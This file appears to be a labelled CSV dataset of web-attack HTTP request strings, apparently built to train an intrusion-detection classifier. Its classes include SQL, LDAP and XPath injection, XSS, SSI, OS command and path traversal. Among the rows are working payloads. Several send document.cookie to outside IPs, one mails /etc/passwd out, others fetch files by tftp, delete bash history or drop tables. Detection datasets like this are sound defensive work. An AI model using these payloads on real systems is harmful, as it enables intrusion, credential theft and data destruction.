,id,class,vector
8600,8600,SSI,/sujxfFUya0P.J/tu/csX.c8G61/wtkvotrezasTjj8a/eHBYJz8Koa7.-/gcKca8nK50k3.4HPuA-K/mrta.cgi?twgd0knQ9lbGna3=tJOGvNkfp1&gneiuhea=273726&c6tbWhcsib=a-rJkkLc&PCexec146a=03128579&eiehi=28&Amea0rXr=%3C%21--++%23exec++cmd%3D%22c%3A%5Cprogra%7E1%5C6pue%5Cupg0paAkmw%5CisoeStw.exe+d%3A%5Cbaoentro%5Cwww.onntleni.org%5CcevT3rtr%5Cdatabase.mdb+++++%2Fx+++++exporttofoxpro%22--%3E&mtirreedeou=8&4wjeifeh6oa=rr8r&thtAsagrn=2431&izrrrA8rhhadr=woe&rj1a=4arent6boilsC&ycietltl5nanE=liah&onineSe=d3htotrm&7osda1awSmlto7o=%2F3&-BZautoexecYA=n2anpatnm
8601,8601,PathTransversal,/../../?
8602,8602,SqlInjection,/fdsdEnent6gagrz9e/l.m/sz8p.gBeTDt@__K/oNU0Y.php4?Bq@QfAAd-N=dAawget&esbeego5siacO=850104&5zWQpb6SJNei=975377&yl2fon=2&eletassqe0Ie=%24lxr%3Caeno%29tAe+mwbn3c&cHsviAnedptraV=twoyGG3CJAAL&rtrhyn9o=68&ar=5197048345&thSenttac=721&Dybs=so2Xht&h5krv=%2Bztffyautoexeca%3Ee&qpllsUy9ricnnqe=m3ne%2Fobgsoundcsogia&hcehraAelto3=%27++++union+++++select++++sum%28dnen%29++from+++SBsnh--
8603,8603,SSI,/rPlbZKCLlTIU/mrhnz3t4lSmhqgrersc/l@OqzmyKbgsoundpa.mspx?1Gajpo=%3C%21--++++%23odbc++connect%3D%22ucee%2C7nti8l%2CgdXm%22+++++statement%3D%22select++++*+++++from++flnsh%22--%3E&DSooBJj.Lv=tpydee&Ih1var8WgVrVA=fbsAd&OqO9sehrEn=r3u1&neeeafea1eaoonr=6tira4dogni8aoka&hco=sbundteBnie&elo=254&llI=179581&rAwsotwrlrra=ima&tmr7=98122464&nn=tqdW51
8604,8604,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
8605,8605,SqlInjection,/x@7DUylT_L.aEX8waWMU/1DhnNSilksnaXpb.3VR/YgbtMM.png?3ce7zicnlletle=atsFn3oiineTnn&ecaDh1O=oniRs&6ecnaShoirembcp=Rsrsynullp&ltoenni=hKdvfaV2&eLTEz=cmtwOng%24sozl%7C&L.MY5n=hsef&Y_execqNoEExmlOvar=rtenS&@xfceWQEustyleP4=97800&2cbgo=hlinksrtsiq%25wi&mi04=%27++++%29++UN%2F**%2FION+++ALL+SEL%2F**%2FECT++++%27ual%27%2C4792%2C79%2C%27emsnl%27%2C9+++++FROM++++ge++++WHERE+++++%28++%27%27%3D++++%27&iduo=iEb&EtlsOxhds=rrHFCx_CBa
8606,8606,XSS,/astrm/0D/o7rebnoh/yuuH-XQ-.rz3/ocohoee0/gT9QRgp/dkmtepdhaethRDfz/r2hQdzjP1.gif?saisrmfrsyt=%3Cdiv+++++onmouseover+++%3D++++%22+++%5Balert+%28%270mblnmh9ba%27%29%3B%5D+++%22++%3E
8607,8607,OsCommanding,/itqtO8ASrdJ18/%um80@PwLHHTDzla/mofipessse/rSR.w/sd2CrF4SsS5ZfFC-Twp/czlkelh7l1a/sGF0GLT/gehh3L@x/ignIfiht4a/vJEsKyF1.js?deEsTnitl0ispn=%7C+++dir++++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++++%2C&deile1oWd=1373
8608,8608,PathTransversal,////?
8609,8609,XSS,/deRadOI6W_WkJ9U/aiNvLN6eOitStR1/ZyVhavingXQ4hq82/luirbtEacie/sru/rxCSpL6LS./xNZ/yiae.cgi?nlntotEnut=7652&hnenio=en-ZR3K.&aRf3s8sun=%3Cimg+++src+++%3D+++%22+++++esor+++%3E++++%22++onmouseover++%3D+++%22+%5Bwindow.open%28%27http%3A%2F%2F89.255.38.241%2Fetnsge.dll%27%2Bdocument.cookie%29%3B%5D++%22+++%3E&rawnvso=01&3gm9ronlte=453746&XfUllEjsaN=imi
8610,8610,SSI,/3MXHBasgNEc/oe40vb/lhdUdnrrssae0zha2/objectMZGgW3evBRWn/JfromHEOK/a.rRC8ThhKrbsBmbN/9gC/_Y3szposition@r-/ifZ8U4-_UmS6@a9myqY/9dBOVl/tzerdsim6s7teeB7ep/nDxge1wGxL71-.php4?UnOo0styles=l+rk&Yws7rqiiM=6de4repe0r&yrej60vodDs=2&-F0XPL0Ca=ttn&deyet=tiwp-si&kwv1OOCrlXxg=%3C%21--+%23include+++++virtual%3D%22%2Fetc%2Fpasswd%22++--%3E&IkjUcw=16688677&rhiEkc=74829056&J4I-JG2amailWf=423351&37ced9eu=at&zw2zpegn3d=s8Grqonmyiie
8611,8611,LdapInjection,oTqniO=86735&0hglshiIrgttNTc=22892002&GT78k=718)(&(objectClass=tuer)(|(sn  =rt0s)(cn=mhch   J*))&jt=8808134832&u6hssitntd=eeoaGod$oih&5R00=t1gpeb3s&hhOns4HusEebt=ytacqtmp&dautoexecB.ZK36ZO5Y=747908&9os=QTncnitEerobyrKoe&m8=we')nt(i%uautoexecn&ys6atoorrtoo=293&5z1hnK=089
8612,8612,SqlInjection,/ye4Pdee/shutdownK/fytrccris9oim5/NaQvbscriptLPkyLmU7B./26RJtmpy8L7.WJB/dzmailR-Qdocument_@8.selectm.png?rfmaEDta=isdlacyN5ctteh&itef6dTguefie3=gmm_jIm
8613,8613,PathTransversal,/d_/mYj/vsiroeehtt/kYidwGhXHTT-t4PK3E/ueEea5r34cirlxeE/seZwjXI.dll?eiiewO=%2Fetc%2Fpasswd&imzeijd=cCUFPdB&IiteigehiQ0l=t2I+n%40&wenmda=7535716&etwt3ekf=41484
8614,8614,SqlInjection,/hKz4Y0pfBra.5_E8.lfI.swf?fxhnloanms=2&aota5ldze=enms&HX9fofr=cqvoast0owta%2Bdboot.inir&ubrtoetpz7e=ds&jmHH_0.DPnetcatE=87358714&dtOa=pw%3Bs%3D&ooetomc=rzHexec%26&inhedldatmmecni=021239125&P2_BD4k6FR=aDG9MWuz&sntcsyhlttgppd=95&j97S8wWKconnect=neYhs&kY9=adtc3idvdrop+n&elenre=7838454
8615,8615,PathTransversal,/nr6pnaNtlhz5flaChs0/7I5eWpassthru_aPkVY_7bin/a9GLTS7djtGWy/wd9a/oetdsxhmaytauFai/ihhvMZzG/h29s9i2xxtadptu.pl?4iZ@Ksu@0htpassc=mg+%7Ce%7E+g9Aadminutexecgroup+bym1hse&vc=838257737&-EphpkY=1207174&uaras3pDwjynl=581228&vor3oaeregJm=5&wsBqSandy=mvq.w_RA7V&putesnItN=eehbgsoundomf%29rt&tg3dwhopMja=%3C%21--%23include++virtual%3D%22%2Fetc%2Fhttpd%2Fhttpd.conf%22++++--%3E&ml=t%40bOXNK
8616,8616,XSS,/okmwKP_2r/pgtpdd/ci8hovuu2srdhgl/nynsincsaeosndatt/e88b@7HI/uVGG_tZ3WwdtdFzz/MpLXCMe/uez8togheneol5vcetdd.asmx?EhhGenLar3kb=ieqAeaouaefshhsWt&3oedadri=Txe3ra&n6mLo=01583259&gmcq_P0CCm=gtOe2erSoho3s1&negifzpb0aLrehh=%3Cimg+src++%3D+%22+setaneni+%22onmouseover+%3D%22%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.na.com%2Fcgi-bin%2Fonri.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&Pqphphz=m1NreizyXp5frmnre&saTioEce=1909850
8617,8617,SqlInjection,/rM7G/u@LMYinsh8@FL7UfIlwC/M73xBD/ojRoKYp/gURar_5d4zYpf6eWL2k/iSCP/v9tfRO/i-A3sI9vDRwKz2U6O.tiff?2bcapk3n=chee&ejgieedtyrxtleb=Wro1&J1_ZqQCpd=eree0t&ahzeanoubttT=8757397412&FZc6NIx=dUSKZbgG&el55gktd1eyy9r=%27+++%2F**%2F++++OR+++++%2F**%2F%27%27%3D+++%27&e5wqt=u
8618,8618,SSI,/jodieOtLuTnriB/y.pC2v/eF-hS7Lgd55oM/eIalTaaUguNzpis0xtd/hoRrilnal4dr/wJ0QCLbcduFP3TiGm/sDEhocwFW65_Dw/bnmvnyo.png?lt=065246&oeswE=aG8Xx-Mo-&3ume0lmi2hcASfn=6fax3re&oZgptgeyda=%3Be%40H5&n2eya=xjdyebduemondh&omWneqo0es=%3C%21--%23email+fromhost%3D%22www.ScueLat.com%22+tohost%3D%22mailbox.azn.com%22+message%3D%22kitn+nhTotge+wbW+nmgr%22+fromaddress%3D%22oolut.com%22+toaddress%3D%22afrur.iLen.com%22+subject%3D%22ze%22+sender%3D%22gl.com%22+replyto%3D%22jntun.com%22+cc%3D%22aisr%22+inreplyto%3D%22eci+5aB+or%22+id%3D%22kesmail%22+--%3E&LGRxX5=em&t1ao=r6s&2e=hiei&aHtsnh=ogodudUinsE&g1inE5peL=9014&Uoeilo=wvrT%25it&onhbCenoiecepnl=sie&anz0s8tidnss=n
8619,8619,SqlInjection,/ezZP9sgyYc15.tN/aGetazoqcQgf/2i0Tl./C4T/aiatrehaTa/g5WUAT9BaPF4t3V6re/pFhtacces/BUtmpP.CEaccess_logf0netcat/ao.tiff?_C@5gechob2fXhQ=frmL-dFPtij&rsellOsnoa=awhel8%5Da%29+cfr&IN5XAsysteml0bodyQ=er6Q&Er5TSZKs8V=h+csuiai&uisuA3=chairs%27+UNION+SELECT+++anlrijme++++FROM+dba_users+++WHERE+++name+++++like+++%27%2525&QwmrLmax9zx=egehIUa2_QI&wmuwooersecsma=2301705&aetl=ey%40+&chza6AucvosT=yWOgmohhr%24nph-OJ%7Ef9me&94msEt4ghs1ey=6421444&Wte6fjwIoaM=E%7Cdm&thuoh=iOLoreaes&GVfmEjwherecnperlq=tnkbgj9KveeHI
8620,8620,LdapInjection,5tqle=30283
8621,8621,LdapInjection,Rrkqdoehdned=snae&U2having2RVxY=l9&nGpwnezr=zIestieoekeir2nArS&inputMri=08oG.U&likerr4rincludev6kK=67&vmu3ixmg1iauytl=)    (    |    (brcOe=aolE*)&EreF=bn
8622,8622,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8623,8623,XSS,/46Z.g/s4grKFN.Tq7/ckQ/an8e5/RczEYmservicess/liiozgzosdwgg.mdb?xaile=2537778&lsVDZWUitaw9=0437878&jEcr9BtHnee=rs3f-&Ftmcsw6pmtt6osa=gntlM&Bba0Z=et&ahsrrasn=%3Cimg+++src++%3D++%22+++++mocha%3A%5Bwindow.open%28%27http%3A%2F%2F142.232.134.230%2Fnaic.cfm%27%2Bdocument.cookie%29%3B%5D+++++%22%3E&albedg=lcua9raoa&t0nnoaent=858458&6OadQQ=s+11n
8624,8624,SSI,/ioRifttE8t/s-JF7/t-3B2_BlR_RE.a2wU/a2o.htm?u8ndrOa3=i9VNql13Hp9C&dsltl=e&ytNGSOry81anM=c&-ncKrmc=yiWiDoc1wfiAnu&V9iTI05=pa&HPfhL-6@=wbnR4eutie&snltfaec4ni=%3C%21--+%23exec++++cmd%3D%22%2Fbin%2Fmail+aUl1Eyo.com+++%3C+++%2Fetc%2Fpasswd%22--%3E&71ek=zNca%26ic%5Dd%2Fia+%2Fc&eaekh8roHt=lexIJ.a
8625,8625,OsCommanding,/nthttrnaxA40tt3/mti/JmrrsmyeiEtenoiE/9V7k/tbtiao2leyleAtrgaoi.nsf?iIs8me=a6ibllseoao&ksgjtSe=eu&3Dpln=m-4GU&5efPbh9=5a1rR&egsoOr=+z&eelzixegnhnah=a%24&slaiS=275&Eu=tidHagb&epjH=yl4dUuTl&tysnAtrdn=%27++%3Buftp+-g++%2Fhome%2Fvesiniales%2Fnaleontiasel++145.139.254.182++++%2Ftror++++%3B&axyeaieees=38616697&4os24=f2Nsbq
8626,8626,PathTransversal,/@PdivEr8tOhttplHGw6L/a2es/eenthuO4vee/538ionitKb/ehagxsc6tiemtor6ox/Vwservices/WEWuGadmin9_v/opavk4Fyx/ha3ftVknrRoabdotp.gif?tszgdwL=877331&AV5gLYBp=uomeatj0tuwj&ea8oe1tdd=695652240&trtdnesu8as=pfeeeww+59script%3E&otyepA7=%5Ctmpjs%26&RzAdl4BOh.R4=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&fDnK_o2TSA8=sNt&nt9rtnuak4=sho&eigoeikhalae=694&Htt=77540&UvbscriptW-7kMVjuq=1&-stdiniU=ciW%40&2iaaCe=retomt+t
8627,8627,LdapInjection,/oWAt/Nzsystem.php?0Ti9iiautoexecyc.=a9M+ileYdf&4xk7likeocC=ia%29%28%26%28objectClass+%3D++5cte*%29
8628,8628,LdapInjection,/bFv_xmJiIYcgQHb9yr.mspx?Mfjovnnyarj=ep2t%29%28%26%28objectClass++%3D5oa*%29&CortAwOlosn=etcmtno5&qidn1v=etc%29rlaeareileoe&elhooTGw=oBrNhatu&armituigha=nwN6rNliEzdoye&858zoctUSzz=undc%3Draea%3C&GfKmK4Sh=566981&owrl9g=2aoirlw5
8629,8629,SqlInjection,/snmb@IVutmmiseW9qdO/hTeqseeaqsrtn/t4jxVyTIq.f/oNaiS.THxWcx/mYdm6-.png?dl=em+se&N4Bperl8tPstyle=%27++++group++by+++++users.id+having++27%3D27&RwQAUiloga=Si%3C&eootreetg=e60adelete-6To+%3Fsr&to=eKsU&aehfhiln1p=esdomrtdnsystemciE&aiSaU1eanoLmlz2=tsiOatf7rne71
8630,8630,PathTransversal,/../../?
8631,8631,SqlInjection,/azVfKs7_eD-D16/Yxzzl1kr/Ri.nsf?optpasswdXGGZJOM9Z=45793&radeaimtnocasc=235274&osneIrnqesaq=104043162&ipqnxJanoa=7569180&gBst=%27+++%2F**%2F+++++OR++++%2F**%2F%27%27+%3D++%27&kpantseCEnzhy=aBu&t0l7hniega=dE0jdlH&aro=31&ecoorC=d3G&nmuBzcx7u0=yR4.83%40&8dssLoSogda=4296&0ti6hIl=9
8632,8632,SSI,Qosexodn=gesrm&ezrxe=tnwr&Ye2oe=rgBchu&ttinol1soob9=787&pH=aebdusk\iswhereht&lhnm=etcoOtnxaatinbn&foebu5=6teohga3o&os8cHobzlcBuset=2
8633,8633,SqlInjection,/rchOnsmtHpI/ttwefmionvh8zti9kPu/tuobigs/rs6HB/yUemg5vK5My-0-L.css?ms4i47enncaS=3792841165&ndsclivtro5Ej=cF5Y&amfBarecuel=%3Balter+table++++riliiens++set+password+%3D++++%27Isyty%27++where++++name+%3D+%27sedie%27%3B&b4vCmnZ=aid
8634,8634,XSS,/eq/dDYqZmeVLO8S.w@l/lp9a/egHTbmF-.html?7iTegxhtsor3lm=%3Clink++rel+%3D++++%22+++++stylesheet+++++%22+href+++%3D++++%22++++javascript%3A%5Balert++++%28%276oyn%27%29%3B%5D+++++%22+++%3E
8635,8635,PathTransversal,/error/\..\..\..\..\winnt\win.ini?
8636,8636,XSS,"/""><img"
8637,8637,LdapInjection,/insertJErVp38bmochaEI5/welncTn0/eotftepT/r0YtoO/hi7R./ogshei/skiXL/nrnvl2w/iD1mw_lL/rcVkNTpyWWv.jpg?slrns1fiocrs9o=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
8638,8638,SqlInjection,/cbtths30mccnjoecst/uS88hddqm/gbtecgdiaaasnqeo6tEq/RetcgmYIl./yTrenaamleepdcN7oaip/hmsaYtoh3j/dQnydT/o0eknt4akeaa.exe?oVh0=VefIuopto&hhslNoiNe8mlh9=8&tisree=cpk&nBnyAc37at=%27%3B+++drop+++table++++pgsdtsaevse&ks9sut=592&ufiLolztooa=hZrsjA48J&oTgW=t%28ts&bYxituon=efxterm2d%3Aranmdyd%26pt&EORqyaUOB3cat.=6832&sq3remp=onnu
8639,8639,LdapInjection,/Olocationdelete3mG0HE/e4ocid/eBqNHdw/x2ot_5Ohttpsm/hsbin6perl-gHxxterm6bq/1mmr4e9xe5e/2PSkV1Oy3wEFa/7En/nvZ_v6Arb/i2nVna5eG04nwe/ldrit.sh?s0caEwipschsicn=0tTio3eesa5n8ie&eteGt=bhbvls
8640,8640,XSS,/4tteOsiwM/aru-e7jjFrjumUsHOe/uukhnoe3wsig/r206zGKPWcA/e8TknsD6.A/70WH/tLyw7tclv/urswOf1.jpeg?atRcl=569&jtslc=43&CKlT9c=sdr&y9=%290ynipositionnycwherefmailtt&nki=8%7CAcagctm&qrEvrro=%3Cform%2Bname%3Dn5t%3E%3Cselect%2Bname%3Dnt++++%3Ehttp%3A%2F%2Fwww.mrmd.com%2FasIV%2F%3F%3C%2Fselect%3E%3C%2Fform+%3E&yraab=2ssubXMP&onwhu1oeDrDln=n9A&y56H=1782808&aa=tucT_G%40oPVo&Qd0ep=37268&gsey=eavrho
8641,8641,SSI,/5n5hs20/5VFNU./hgosyattoytfl/tiabooAirigd/DJ@GTXjcscript0aDO-y/d9tZWH3ELXIYb7KNxG.jpg?VmIa=qanstOs&edj4Sdqrt2hd=n9KAYCMoLg&zCgQz4im=aaett&ip=9719&hAmzY047_4I=05115294&sobe9w=96&vjXB=teT&OB43Vu4=%24unEe&posr1=97126892&40nswer9un=+J91iHa&lltchtS1=%3C%21--+++%23include++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22++++--%3E&i2njsmeesqi=53&saEtrjmeah=dlhomeyeran
8642,8642,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
8643,8643,XPathInjection,/eaXn.htm?et=%2B-+Aa&telcza5x=eladmingyctN5e+sh0drgps&Nsus=65631878&p2yMPT=404+or++enafn3%2FOiwtee%2Foqrlco%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D5%5D++++or++++3656%3D&V@nodeiirboEjJS=rpt%29%5C&teh=2t%2Blosg&ielhkkmsh4tio=agpwziD5.C&e5=+nodewfy%29os&fg3evaie=6&ris8bnt=K7kh0&aiiRtestsetda=4544952280&0afetjthale=0804657
8644,8644,PathTransversal,sogphnpi2edohih=..........................WINNTsystem.ini&TyJe=<pd5do&fnetcatWAORWXp=99&dtSit4ceemeNE=752903937&q6S6nrahec0=da&o7xqzddl8e=07745&h9eezo=ssylhhAadxe&haioWaorrEtt=r8tt&nmul5dfsiar6t=jt4NYti&ep=837&odt7cnenmNo3lz=apilyWwszv&e1cnarfewb=eMps2w.V&taletn=o0&nc=h%0e
8645,8645,XPathInjection,N6O4T@L4Ha=uae3b&access_logHWp0aHfVlocationJQ=b-A-Nu2b&ScatUhO=yxil&S20M47=riae'    or  1<     bern/6aanr/atpgn/child::text()[position()=638]   or     'd0aoab2f' =  '
8646,8646,XSS,/dNK4DG/etS6QHghZg-2-xoa/mIc/dh3ccsrptn2ymNmnn/eyesazDg6eIvd9aeess/nofin7/tc6o0Ernaef/s-1wN/x8Ov@gTTf90Oa.nsf?wHensbatitee8n=%26%3Cscript++%3E%5Bwindow.open%28%27http%3A%2F%2F214.52.214.233%2Fseisle.pl%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++++%3E
8647,8647,OsCommanding,/aan0opptmz/en9as0oYeseye/M4aL1rmIPa.wPL/tdlioytmlt5RIea/bjwfrIvSKi4RHGRZBV/8dbSf/ngTyJadogy/er/afoh7nesoo/e0R37divizDrU2homeP6/aHCrgqGE.l/yx5nDFqS5gva6koAN84.dll?5ctyooqbaudx3=slZ&Pelib3updateb=E&5ee=pig.5fDp1Odz&iIHseemsid=%3C%21--+++%23exec+++cmd%3D%22c%3A%5Cprogra%7E1%5CtIn%5Cfoeeeso4rh%5C8ee8kghd.exe+++++d%3A%5CroEthd%5Cwww.etiese.org%5Cwoa%5Cdatabase.mdb+++%2Fx++++exporttofoxpro%22--%3E&ed6nt=Eiauodocument0&.dDu_eMbLf=ekob&hs=xefer6ew0ndaavja
8648,8648,OsCommanding,aewr=rm  -f    /tmp/pA  |&nisnd=tsoo8et
8649,8649,SqlInjection,/elZtYM/telnetT@0j8@H5Xp5/oh/lnodsiojslnbHstgNrso/ociintetno/09ows9iAene4E7dorx/2Mtq4DBTb.1Ghome1/R0HzFOvxml1Cq3hx2/htRieaS3ot11.shtml?ee2m=le8ok5elsg&rssXa2dteanrse=tOiiueopC6&0a5hutoe=isipS%25&sialcbhtlssy5=dooa+oisdN&tik=3185227433&e7hwainUfoaEt=tfd3khtlayA&f7fy=he%24dl%40jtecwu&Or=5&mpri9ksuA=esfrsyCe&aa=bHg_9Ma
8650,8650,XSS,/rk60wj_fe3MbaLx4473/nlOdu4/qj/dt996etuucocwyot7a/a4Z@P5W8dm/Enhteia/aq/iCkON2pSurnX0Euw4.N/6wO9-mX/tren.dll?XqO4wfJ5CV%u.=551222&Scmch9=nulll&ttds5iHflaeildi=eee7n1ti3&isAdoeoisteqe=Umbstdinhio+P&UlikemochapZmailI0N_@=140394&ij4ksr8GljioM=%3Ca++href%3D%22++javas%26%2399%3Bript%26%2335%3B%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.tretti.com%2Fcgi-bin%2Frodeiclell.cgi%27%2Bdocument.cookie%29%3B%5D%22+++%3E&lctaml=2ac&cIjo4f=it&jad=636362492&ace7Sltgey=e%3Cje&lfun=R&ua=2fVJLM5SP&tamdhriyiooblgw=of%27sp%3Bmailsg%29st+2i
8651,8651,XSS,/oO/eu7pohuRtarbuew/iKV9ZCAazJ84P9gsy.gif?trtEce66ti5od=%3Ca+++++href%3D++++%22about%3A%3Cs%26%2399%3Bript+++%3E%5Bwindow.open%28%27http%3A%2F%2F174.2.169.1%2Fnene.pl%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E+%22+%3E&il8lo0e0gs=iSrreplacesjcM%27&ebeaood=eM&Seo9rDIetf=Econnectg&edHpstdee=15356946&ougnia0aa=nbetween01onodeEea&iTef=%260&ueIAntefsars=96994
8652,8652,OsCommanding,o4wc2aramrhz9n='     ;uftp   -g     /home/enorgeesve/innase    154.239.244.117  /geat  ;
8653,8653,PathTransversal,sdroco6e7t6ecTn=..\..\..\..\WINDOWS\system.ini
8654,8654,OsCommanding,/zehOp9_5/uo/o1ovQtyghdIZizXUa/etearmc/rCAEe0tInrlae0feus/dsSkYkScd7V/jmt01ibg7eThouohsc/FOu-ccatq/pnAE6liamsEEtIgSotcu/fxgS2UE0mWLWGO.cfm?QCnaIAhNU=iwo&4acceptC434=deoa&zeaoaseyulso6=enzdbAa8+t5cc&ctfaxe=%27+++++%3Brm+%7E%2F.bash_history+%3B&iOreorjaiht=between%3B&eser=3&okon=hvesn2i6f&sqaaaO=mCCJ-G3ABQB
8655,8655,OsCommanding,/anjdle2arhbeow/fks/r6puEBuT/dteanensmmd/dii@qE9J/5eneeuRn2tba/vfdnoptg8ndhuVr151.asmx?kb=21087&a7gBsruZsa=yseossi70aarsie&bgsoundwhere7YT2j5perl8=26454&9aaprlHg=8018&opG00k9@nT=irao&..cswQ=224&nn=%7C+++++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++++%2C&bgsoundphREnH7YFU=0885&vNevalF6e=ostBss+&yyuatong=seopdsasets9&t9ypPr9Ehst=s&PtXUX@7FVSexec=00020007&0AonfnshL1=uOhBxobcP&ejsae4rlvK=sTEIdsi4yamti+
8656,8656,LdapInjection,/tnshctr/eEeeefat5rrea3w/dqkdeZ96weKm@X3Ki/yiuletliuaG/dBWxmltKB-mtelnet/h-SrovnZk6TmZWz/c2gnuHYh4IN/7KvOiFgJzPd.mspx?Wa=%29++%28++%7C++%28+cn%3D*o+++%27brien*%29%28mail%3D*o++++%27brien*++++%29++++
8657,8657,SSI,/Rnqntosqdsa/s00pgyWiwB28T.Q9/tAnlos/SiCecdseotnennrgdn/aPVvarF9xadminVbQ/YrhpqNeaf.css?oAeeuznze=%3C%21--%23email+fromhost%3D%22www.beinlw.com%22+tohost%3D%22mailbox.osSnr.com%22+message%3D%22nu6x7+ainh4t+eNwMeet5+aadlc%22+fromaddress%3D%22egarrc.com%22+toaddress%3D%22ie2.825idi.com%22+subject%3D%22nPi%22+sender%3D%22tti.com%22+replyto%3D%222hiet.com%22+cc%3D%22mt%22+inreplyto%3D%22umo+tnes+q%22+id%3D%22himail%22+--%3E
8658,8658,SqlInjection,ioppg1n=OHlaoeoane1v&rrEannnboimai=%auiye8  aese&xdaysZ@UlocationK='   )  UNION    ALL     SELECT n0neI    FROM     eoword WHERE  ( ''    ='&icaR1yyRi=n6oSsdrf:5nn&HvMXreplace=491457527
8659,8659,OsCommanding,/ianeoaia/xterm3nYUb/xnutoUea/between_T/f13MP@528Td_C@C.png?wHWW9GM3H=sv%3Aim5&Peotysexbsm=b9N&htbohtL=+xp_&eqo=00959486&ctcrlbeogea=23&MtRlTwrnH=%5Cnls+%2Froot%2F&v5beeerx0H=2831515&shutdownFformyreplacePK6dropIJo=1145874&iit=tcr+IheSilink%24cps%3B&rn=ouo
8660,8660,LdapInjection,/deLulcYfHxp_l9V/5u/ncesa8cwaeRs/11nheer04smdIrrr/aoyEth3/n9/yNwaaPTCM/iTUPKK0sUR-V4Ih/e_6l6lNH1riE2VJ4uf21/KGHMs0ZJaccess_log6l3/QhtaccespEieRIhomekU.cgi?
8661,8661,XPathInjection,/hAeHPKv9Osnhg@fBIw/9ogoiotsmites/croqecctoadde6/trbmIwat/AVvGFetcdjcmcopyM/zvhadr8/jerJGADku/VVlOgMOconnectVnxle.htm?nrhcthsgtfaek=28312&9a94=o03OuLy6Xd&Itrs=51918&uianc0HHsergmr=encex%5C1t+n3r%2Fe&dlaeAsQs=meepocd5hnsszec&ne=s7s&hdcl=16&8i9eEoq=amowCD0xok&Naar=wwuef%27++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or++%27gh%27+%3D%27&liEeAiu=sldaRei1hqecerit&UthMnsdmeghei=34482
8662,8662,SSI,/ciin1fEs7n/iatrehd8onnurseyIp/ie0eyS5bn5rlsas/ny5DDp8BjrfoHc_u9tcj/tbb21/V7-/zs50x53reehs6ljaj/RsjbuwVuNkTYN2passwd.mspx?yardeIiar=%3C%21--++++%23exec++cmd%3D%22c%3A%5Cprogra%7E1%5Cte0eo9%5CTtimym%5CseonY.exe+d%3A%5Cet2ilnn%5Cwww.arsirotiri.org%5Clttafsni%5Cdatabase.mdb++%2Fx+exporttofoxpro%22--%3E
8663,8663,XPathInjection,a9jierhzt=saecmditi&aoocaihfsnW=eL4X&VMD0j0cat=gi$asam&tttStseemaaE=&7dlf4nya4alex yenph-&ir=79953&MlsWIQhuKAxh=60&txMre= if&eeh=oZOcoFQpfO&swz=06035140
8664,8664,PathTransversal,/gs7jkjb/ogmGZc1q27Ex5W1/mail1ZHGinputEeMRexecWshutdownj/bjsaljgvLbU.html?FhBlM=ctalOeetOeaCabhes3&ise1la=qn&RmNn35PV=%5Bp&gf=%5CWINDOWS%5Csystem.ini
8665,8665,SSI,/yK7Lj-han4A.K.aspx?m9Anccbtnaie=%3C%21--+%23odbc+++statement+++%3D%22select++n0as%2C+roet%2C+vrtn5+from++++hlrbrertci++order++++by++6%2C++88%2C+++++1%22+++--%3E
8666,8666,XSS,"ohitUlysao0E=Tn&ets=84586256&t0zitnis3=5&sn7ta7tgoeaP=evqa&rvintdtnnnlgo=61&etjKntIcIIyiS=unodes&uhw=<xml  src  =  "" javascript"
8667,8667,PathTransversal,.////////////////////////?
